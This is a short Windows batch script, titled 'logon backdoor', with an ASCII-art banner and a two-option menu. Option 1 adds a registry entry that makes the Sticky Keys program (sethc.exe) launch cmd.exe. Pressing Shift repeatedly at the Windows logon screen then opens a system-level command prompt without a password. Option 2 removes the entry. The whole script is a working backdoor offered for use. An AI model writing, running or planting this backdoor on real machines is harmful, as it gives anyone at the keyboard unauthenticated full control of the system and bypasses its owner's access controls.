@echo off
mode con: cols=46 lines=26
title logon backdoor
::: _                         
:::| | ___   __ _  ___  _ __  
:::| |/ _ \ / _` |/ _ \| '_ \ 
:::| | (_) | (_| | (_) | | | |
:::|_|\___/ \__, |\___/|_| |_|
:::         |___/             
::: _                _       _                  
:::| |              | |     | |                 
:::| |__   __ _  ___| | ____| | ___   ___  _ __ 
:::| '_ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
:::| |_) | (_| | (__|   < (_| | (_) | (_) | |   
:::|_.__/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
:::                                             
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
echo =====================MENU=====================
echo 1. Set the backdoor
echo 2. Remove backdoor from PC
set /p a=
if "%a%"=="1" (
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
)
if "%a%"=="2" (
    REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
)
pause
